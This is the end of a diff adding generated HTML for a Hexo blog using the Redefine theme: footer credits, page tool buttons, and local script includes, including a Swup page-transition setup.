+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
